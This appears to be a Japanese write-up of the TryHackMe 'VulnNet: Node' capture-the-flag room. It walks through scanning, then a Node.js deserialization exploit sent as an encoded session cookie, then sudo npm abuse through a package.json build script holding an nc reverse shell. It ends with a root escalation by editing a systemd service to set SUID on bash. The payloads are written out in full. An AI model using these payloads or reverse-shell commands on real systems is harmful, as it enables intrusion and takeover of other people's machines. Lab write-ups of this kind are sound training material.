# VulnNet: Node CTF

https://tryhackme.com/room/vulnnetnode

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.193.183
root@ip-10-10-102-105:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-31 07:20 BST
Nmap scan report for 10.10.193.183
Host is up (0.00035s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
8080/tcp open  http-proxy
MAC Address: 02:88:C0:47:A5:39 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 1.89 seconds
root@ip-10-10-102-105:~# sudo nmap -sV -p8080 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-03-31 07:20 BST
Nmap scan report for 10.10.193.183
Host is up (0.000094s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
MAC Address: 02:88:C0:47:A5:39 (Unknown)
```

HTTP 8080 ポートだけ。

### gobuster

```shell
root@ip-10-10-102-105:~# gobuster dir -x=txt,php -u http://$TARGET:8080 -w ./dirlist.txt -t 30 -k===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.193.183:8080
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                ./dirlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 173] [--> /css/]
/CSS                  (Status: 301) [Size: 173] [--> /CSS/]
/img                  (Status: 301) [Size: 173] [--> /img/]
/Img                  (Status: 301) [Size: 173] [--> /Img/]
/IMG                  (Status: 301) [Size: 173] [--> /IMG/]
/login                (Status: 200) [Size: 2127]
/Login                (Status: 200) [Size: 2127]
/LogIn                (Status: 200) [Size: 2127]
/LOGIN                (Status: 200) [Size: 2127]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

ログインページだけ。

### login

/ を GET すると、下記の Cookie がセットされる。

```http
Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
```

Base64 デコード

```shell
$ echo 'eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ' | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}base64: invalid input
```

username を Admin にして Cookie をセットすると、Admin と画面表示されるので、サーバー側でデシリアライズしていることが分かる。

Node.js デシリアライズ攻撃を狙って、nodejsshell.py で作ったシェルコードを Base64 エンコードし、（末尾に %3D%3D を付けて）session クッキーに設定して画面更新。

```shell
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7IGV2YWwoU3RyaW5nLmZyb21DaGFyQ29kZSgxMCwxMTgsOTcsMTE0LDMyLDExMCwxMDEsMTE2LDMyLDYxLDMyLDExNCwxMDEsMTEzLDExNywxMDUsMTE0LDEwMSw0MCwzOSwxMTAsMTAxLDExNiwzOSw0MSw1OSwxMCwxMTgsOTcsMTE0LDMyLDExNSwxMTIsOTcsMTE5LDExMCwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksOTksMTA0LDEwNSwxMDgsMTAwLDk1LDExMiwxMTQsMTExLDk5LDEwMSwxMTUsMTE1LDM5LDQxLDQ2LDExNSwxMTIsOTcsMTE5LDExMCw1OSwxMCw3Miw3OSw4Myw4NCw2MSwzNCw0OSw0OCw0Niw1MCw0Niw1MCw1MCw0Niw0OSw1Niw1MCwzNCw1OSwxMCw4MCw3OSw4Miw4NCw2MSwzNCw1NCw1NCw1NCw1NCwzNCw1OSwxMCw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw2MSwzNCw1Myw0OCw0OCw0OCwzNCw1OSwxMCwxMDUsMTAyLDMyLDQwLDExNiwxMjEsMTEyLDEwMSwxMTEsMTAyLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsNjEsNjEsMzIsMzksMTE3LDExMCwxMDAsMTAxLDEwMiwxMDUsMTEwLDEwMSwxMDAsMzksNDEsMzIsMTIzLDMyLDgzLDExNiwxMTQsMTA1LDExMCwxMDMsNDYsMTEyLDExNCwxMTEsMTE2LDExMSwxMTYsMTIxLDExMiwxMDEsNDYsOTksMTExLDExMCwxMTYsOTcsMTA1LDExMCwxMTUsMzIsNjEsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwNSwxMTYsNDEsMzIsMTIzLDMyLDExNCwxMDEsMTE2LDExNywxMTQsMTEwLDMyLDExNiwxMDQsMTA1LDExNSw0NiwxMDUsMTEwLDEwMCwxMDEsMTIwLDc5LDEwMiw0MCwxMDUsMTE2LDQxLDMyLDMzLDYxLDMyLDQ1LDQ5LDU5LDMyLDEyNSw1OSwzMiwxMjUsMTAsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDMyLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsMzIsNjEsMzIsMTEwLDEwMSwxMTksMzIsMTEwLDEwMSwxMTYsNDYsODMsMTExLDk5LDEwNywxMDEsMTE2LDQwLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsOTksMTExLDExMCwxMTAsMTAxLDk5LDExNiw0MCw4MCw3OSw4Miw4NCw0NCwzMiw3Miw3OSw4Myw4NCw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsNDEsMzIsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExOCw5NywxMTQsMzIsMTE1LDEwNCwzMiw2MSwzMiwxMTUsMTEyLDk3LDExOSwxMTAsNDAsMzksNDcsOTgsMTA1LDExMCw0NywxMTUsMTA0LDM5LDQ0LDkxLDkzLDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTE5LDExNCwxMDUsMTE2LDEwMSw0MCwzNCw2NywxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTA1LDExMCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDExMSwxMTcsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTE1LDExNiwxMDAsMTAxLDExNCwxMTQsNDYsMTEyLDEwNSwxMTIsMTAxLDQwLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMjAsMTA1LDExNiwzOSw0NCwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsOTksMTExLDEwMCwxMDEsNDQsMTE1LDEwNSwxMDMsMTEwLDk3LDEwOCw0MSwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMDEsMTEwLDEwMCw0MCwzNCw2OCwxMDUsMTE1LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsMTAxLDEwMCwzMyw5MiwxMTAsMzQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMSwxMTAsNDAsMzksMTAxLDExNCwxMTQsMTExLDExNCwzOSw0NCwzMiwxMDIsMTE3LDExMCw5OSwxMTYsMTA1LDExMSwxMTAsNDAsMTAxLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTAxLDExNiw4NCwxMDUsMTA5LDEwMSwxMTEsMTE3LDExNiw0MCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw0NCwzMiw4NCw3Myw3Nyw2OSw3OSw4NSw4NCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMTI1LDEwLDk5LDQwLDcyLDc5LDgzLDg0LDQ0LDgwLDc5LDgyLDg0LDQxLDU5LDEwKSl9ICgpICJ9
```

リバースシェルを取得できた。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.193.183] 39466
Connected!
id
uid=1001(www) gid=1001(www) groups=1001(www)
```

```shell
ls -al /home
total 16
drwxr-xr-x  4 root        root        4096 Jan 24  2021 .
drwxr-xr-x 23 root        root        4096 Jan 24  2021 ..
drwxr-x--- 17 serv-manage serv-manage 4096 Jan 24  2021 serv-manage
drwxr-xr-x  7 www         www         4096 Jan 24  2021 www
ls -al /home/www
total 40
drwxr-xr-x 7 www         www         4096 Jan 24  2021 .
drwxr-xr-x 4 root        root        4096 Jan 24  2021 ..
lrwxrwxrwx 1 root        root           9 Jan 24  2021 .bash_history -> /dev/null
-rw-r--r-- 1 www         www          220 Jan 24  2021 .bash_logout
-rw-r--r-- 1 www         www         3771 Jan 24  2021 .bashrc
drwx------ 3 www         www         4096 Jan 24  2021 .config
drwxrwxr-x 3 www         www         4096 Jan 24  2021 .local
drwxrwxr-x 5 serv-manage serv-manage 4096 Jan 24  2021 .npm
drwxrwxr-x 5 www         www         4096 Mar 31 08:15 .pm2
-rw-r--r-- 1 www         www          807 Jan 24  2021 .profile
drwxr-xr-x 5 www         www         4096 Jan 24  2021 VulnNet-Node
```

serv-manage ユーザーに昇格する必要があると思われる。

## 権限昇格１

```shell
www@vulnnet-node:~/VulnNet-Node$ sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

serv-manage として npm を実行できる。

package.json を作成し、build スクリプトとしてリバースシェルを実行する。

```shell
ww@vulnnet-node:~$ cat ./package.json
{
  "scripts": {
    "start": "node app.js",
    "build": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.2.22.182 6667 >/tmp/f"
  }
}

www@vulnnet-node:~$ sudo -u serv-manage npm run build
```

リバースシェル取得成功。

```shell
$ nc -nlvp 6667
listening on [any] 6667 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.193.183] 42242
$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
$
```

```shell
$ ls -al /home/serv-manage
total 108
drwxr-x--- 18 serv-manage serv-manage 4096 Mar 31 09:25 .
drwxr-xr-x  4 root        root        4096 Jan 24  2021 ..
lrwxrwxrwx  1 root        root           9 Jan 24  2021 .bash_history -> /dev/null
-rwxr-x---  1 serv-manage serv-manage  220 Jan 24  2021 .bash_logout
-rwxr-x---  1 serv-manage serv-manage 3771 Jan 24  2021 .bashrc
drwxr-x---  8 serv-manage serv-manage 4096 Jan 24  2021 .cache
drwxr-x--- 15 serv-manage serv-manage 4096 Mar 31 09:22 .config
drwxr-x---  3 serv-manage serv-manage 4096 Jan 24  2021 .dbus
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Desktop
-rwxr-x---  1 serv-manage serv-manage   26 Jan 24  2021 .dmrc
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Documents
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Downloads
drwxr-x---  3 serv-manage serv-manage 4096 Jan 24  2021 .gnupg
drwxr-x---  3 serv-manage serv-manage 4096 Jan 24  2021 .local
drwxr-x---  5 serv-manage serv-manage 4096 Jan 24  2021 .mozilla
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Music
drwxr-xr-x  3 serv-manage serv-manage 4096 Mar 31 09:25 .npm
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Pictures
-rwxr-x---  1 serv-manage serv-manage  807 Jan 24  2021 .profile
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Public
-rwxr-x---  1 serv-manage serv-manage    0 Jan 24  2021 .sudo_as_admin_successful
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Templates
drwxr-x---  4 serv-manage serv-manage 4096 Jan 24  2021 .thumbnails
-rw-------  1 serv-manage serv-manage   38 Jan 24  2021 user.txt
drwxr-x---  2 serv-manage serv-manage 4096 Jan 24  2021 Videos
-rwxr-x---  1 serv-manage serv-manage   57 Jan 24  2021 .Xauthority
-rwxr-x---  1 serv-manage serv-manage   14 Feb 12  2018 .xscreensaver
-rw-------  1 serv-manage serv-manage 2538 Jan 24  2021 .xsession-errors
-rwxr-x---  1 serv-manage serv-manage 2538 Jan 24  2021 .xsession-errors.old
$ cat /home/serv-manage/user.txt
THM{06...........................}
```

ユーザーフラグゲット。

## 権限昇格２

```shell
$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

root として vulnnet サービスを停止、開始できる。

```shell
serv-manage@vulnnet-node:/home/www$ systemctl cat vulnnet-job.service
# /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

変更可能。

```shell
cerv-manage@vulnnet-node:/home/www$ ls -al /etc/systemd/system/vulnnet-job.servic
-rw-rw-r-- 1 root serv-manage 197 Jan 24  2021 /etc/systemd/system/vulnnet-job.service
```

bash に SUID を付けるように変更した。

```shell
serv-manage@vulnnet-node:/home/www$ systemctl cat vulnnet-job.service
# /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
#Type=forking
User=root
ExecStart=/bin/chmod +s /bin/bash

[Install]
WantedBy=multi-user.target
serv-manage@vulnnet-node:/home/www
```

再起動し、bash に SUID が付いたことを確認。

```shell
serv-manage@vulnnet-node:/home/www$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:/home/www$ sudo /bin/systemctl start vulnnet-auto.timer
serv-manage@vulnnet-node:/home/www$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1113504 Apr  4  2018 /bin/bash
```

root 昇格成功

```shell
serv-manage@vulnnet-node:/home/www$ bash -p
bash-4.4# id
uid=1000(serv-manage) gid=1000(serv-manage) euid=0(root) egid=0(root) groups=0(root),1000(serv-manage)
```

```shell
bash-4.4# cat /root/root.txt
THM{abea...........................}
```

ルートフラグゲット！

## 振り返り

- たまたま前日に JaxSucksALot をクリアしたばかりだったので、デシリアライズ攻撃はすぐに気付いた。
- npm を使うパターンは初めて。
- サービスを使った権限昇格も良い復習になった。
